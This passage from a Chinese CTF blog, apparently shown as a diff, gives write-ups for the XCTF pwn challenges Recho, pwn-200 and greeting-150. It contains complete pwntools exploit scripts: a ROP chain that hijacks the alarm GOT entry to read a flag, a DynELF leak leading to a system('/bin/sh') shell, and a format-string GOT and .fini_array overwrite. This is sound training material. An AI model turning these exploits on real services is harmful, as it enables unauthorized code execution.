class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br>第四步：构造printf(buf)<br><span class="hljs-comment">#print flag</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br>根据以上描述，构造payload如下<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./Recho&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41714&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x4008a3</span><br>pop_rax_ret = <span class="hljs-number">0x4006fc</span><br>add_rdi_ret = <span class="hljs-number">0x40070d</span><br>pop_rsi_ret = <span class="hljs-number">0x4008a1</span><br>pop_rdx_ret = <span class="hljs-number">0x4006fe</span><br>alarm_plt=elf.plt[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>alarm_got=elf.got[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>flag = <span class="hljs-number">0x601058</span><br>buf = <span class="hljs-number">0x601068</span><br><br><span class="hljs-comment"># 劫持alarm的got表</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># rdi = alarm_got</span><br>payload+= p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br><br><span class="hljs-comment"># 构造 fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br>payload+=p64(pop_rdx_ret)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br><span class="hljs-comment"># 构造 read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br><br><span class="hljs-comment">#构造 printf(buf)</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to Recho server!\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.shutdown(<span class="hljs-string">&#x27;send&#x27;</span>)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-pwn-200-dynelf模块使用"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn-200-dynelf模块使用"></a> 攻防世界-pwn-pwn-200-DynELF模块使用</h1>
+<p>1.先检查程序保护，32位程序，发现只开启了NX保护</p>
+<p>​          <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221127258.png" srcset="/img/loading.gif" lazyload alt="image-20210413221127258" style="zoom:67%;"></p>
+<p>2.使用ida查看函数，主函数如下</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221142918.png" srcset="/img/loading.gif" lazyload alt="image-20210413221142918" style="zoom:67%;">
+<p>发现在sub_8048484()函数下存在栈溢出漏洞</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221159623.png" srcset="/img/loading.gif" lazyload alt="image-20210413221159623" style="zoom:67%;">
+<p>该题无libc，我们可以使用pwntool的DynELF模块</p>
+<p>此题目借助DynElF模块实现有一下要点</p>
+<p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点：</p>
+<p>1）调用write函数来泄露地址信息，比较方便；</p>
+<p>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p>
+<p>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p>
+<p>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
+<h3 id="dynelf模块介绍"><a class="markdownIt-Anchor" href="#dynelf模块介绍"></a> DynELF模块介绍</h3>
+<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br><br> <span class="hljs-comment">#各种预处理</span><br><br> payload = <span class="hljs-string">&quot;xxxxxxxx&quot;</span> + address + <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br><br> p.send(payload)<br><br> <span class="hljs-comment">#各种处理</span><br><br> data = p.recv(<span class="hljs-number">4</span>)<br><br> log.debug(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (address, (data **<span class="hljs-keyword">or</span>** <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br><br> <span class="hljs-keyword">return</span> data<br><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">&quot;./xxx&quot;</span>))   <span class="hljs-comment">#初始化DynELF模块</span><br><br>systemAddress = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>) <span class="hljs-comment">#在libc文件中搜索system函数的地址</span><br></code></pre></td></tr></table></figure>
+<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p>
+<p>借助write函数，可以实现泄露</p>
+<p>所以我们的leak函数可以这么写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    r.send(payload)<br>    data=r.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> r.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br></code></pre></td></tr></table></figure>
+<p>我们还需要找到一个连续3次pop的地址，这里找到的是0x0804856c</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221514111.png" srcset="/img/loading.gif" lazyload alt="image-20210413221514111" style="zoom:67%;">
+<p>然后我们需要一个bss段写入，这里可以用0x0804A020</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221605895.png" srcset="/img/loading.gif" lazyload alt="image-20210413221605895" style="zoom:67%;">
+<p>准备了这些条件后，我们就可以构建payload脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;220.249.52.134&quot;</span>,<span class="hljs-number">36377</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn200&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>start_addr=<span class="hljs-number">0x080483d0</span><br>vulnaddress=<span class="hljs-number">0x08048484</span><br>elf=ELF(<span class="hljs-string">&quot;./pwn-200&quot;</span>)<br>write_plt=elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_addr = <span class="hljs-number">0x0804a020</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    p.send(payload)<br>    data=p.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> p.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br><span class="hljs-comment">#调用_start函数，恢复栈</span><br>payload1 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload1 += p32(start_addr)<br>p.send(payload1)<br>p.recv()<br><br>ppp_addr = <span class="hljs-number">0x0804856c</span>  <span class="hljs-comment">#获取到的连续3次pop操作的gadget的地址 </span><br>payload2 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload2 += p32(read_plt)<br>payload2 += p32(ppp_addr)<br>payload2 += p32(<span class="hljs-number">0</span>)<br>payload2 += p32(bss_addr)<br>payload2 += p32(<span class="hljs-number">8</span>)<br>payload2 += p32(sys_addr) + p32(vulnaddress) + p32(bss_addr)<br><span class="hljs-comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span><br><span class="hljs-comment">#构造read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span><br><span class="hljs-comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span><br>p.send(payload2)<br>p.send(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"><a class="markdownIt-Anchor" href="#攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"></a> 攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环</h1>
+<p>1.首先检查程序</p>
+<p>​      <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221809095.png" srcset="/img/loading.gif" lazyload alt="image-20210413221809095" style="zoom:67%;"></p>
+<p>32位程序，只开启了栈保护和堆栈不可执行</p>
+<p>2.用ida查看程序中的函数</p>
+<p>主函数如下</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221907760.png" srcset="/img/loading.gif" lazyload alt="image-20210413221907760" style="zoom:67%;">
+<p>该程序的大致就是向v5读入64字节，读入成功后，将v5的内容输出到s里面，之后将s直接输出，这最后一个printf(&amp;s)存在一个格式化字符串漏洞，可以进行利用，进行任意地址读写</p>
+<p>3.接下来需要测试偏移</p>
+<p>输入</p>
+<p>.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221928354.png" srcset="/img/loading.gif" lazyload alt="image-20210413221928354"></p>
+<p>可以看到对于该程序，输出的第43个字节是我们的”.”号的ASCII码值0x2e</p>
+<p>但是该程序没有循环，就算是我们覆盖了got表的地址，也无法再次返回程序了，这时候我们需要用到一个可以使用格式化字符串漏洞使程序无限循环的漏洞</p>
+<p>此漏洞原理为：写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p>
+<p>具体流程如下</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221946280.png" srcset="/img/loading.gif" lazyload alt="image-20210413221946280" style="zoom:67%;">
+<p>简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
+<p>而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。</p>
+<p>所以当main运行第一次时，将strlen函数的got表覆写成system的plt地址，然后将.fini._arra第一个元素覆写成strat地址，进而造成循环，第二次main函数时，输入“/bin/sh\x00”，在调用strlen函数时就会变成system(&quot;/bin/sh&quot;),进而拿到shell。</p>
+<p>经过查看，system的plt表地址为0x8048490</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222012210.png" srcset="/img/loading.gif" lazyload alt="image-20210413222012210" style="zoom:67%;"> 
+<p>调用的fini_got = 0x8049934</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222025348.png" srcset="/img/loading.gif" lazyload alt="image-20210413222025348" style="zoom:67%;">
+<p>又知道这里的数据为0x80485A0,又因为main函数的地址为0x08485ED，所以我们只需要修改后2位的数据即可让调用fini的时候返回main函数</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222048628.png" srcset="/img/loading.gif" lazyload alt="image-20210413222048628" style="zoom:67%;">
+<p>然后通过查看知道strlen的got表地址为0x8049A54</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222103549.png" srcset="/img/loading.gif" lazyload alt="image-20210413222103549" style="zoom:67%;">
+<p>综上所述</p>
+<p>fini_got = 0x8049934</p>
+<p>main_addr = 0x80485ED</p>
+<p>strlen_got = 0x8049A54</p>
+<p>system_plt = 0x8048490</p>
+<p>因此设置一个数组为</p>
+<p>arr = [</p>
+<p>0x85ED,</p>
+<p>0x8490,0x804</p>
+<p>]</p>
+<p>因此，我们要在fini_got写入2字节数据arr[0]</p>
+<p>在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]</p>
+<p>进而构造payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-number">46970</span>)   <br>fini_got = <span class="hljs-number">0x8049934</span>  <br>main_addr = <span class="hljs-number">0x80485ED</span>  <br>strlen_got = <span class="hljs-number">0x8049A54</span>  <br>system_plt = <span class="hljs-number">0x8048490</span>  <br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">2</span>  <br>payload += p32(strlen_got)  <br>payload +=  p32(strlen_got+<span class="hljs-number">2</span>)  <br>payload += p32(fini_got)  <br>arr = [  <br>   <span class="hljs-number">0x85ED</span>,  <br>   <span class="hljs-number">0x8490</span>,<span class="hljs-number">0x804</span>  <br>]  <br><span class="hljs-comment">#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  </span><br><span class="hljs-comment">#修改strlen GOT内容的前2字节  </span><br>num = arr[<span class="hljs-number">2</span>] - <span class="hljs-number">32</span>  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%13$hn&#x27;</span>  <br><span class="hljs-comment">#修改strlen GOT内容的后2字节  </span><br>num = arr[<span class="hljs-number">1</span>] - arr[<span class="hljs-number">2</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%12$hn&#x27;</span>  <br><span class="hljs-comment">#修改fini的后2字节  </span><br>num = arr[<span class="hljs-number">0</span>] - arr[<span class="hljs-number">1</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%14$hn&#x27;</span>  <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)  <br>p.sendline(payload)  <br><span class="hljs-comment">#get shell   </span><br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)   <br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)   <br>p.interactive()  <br><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻防世界刷题记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
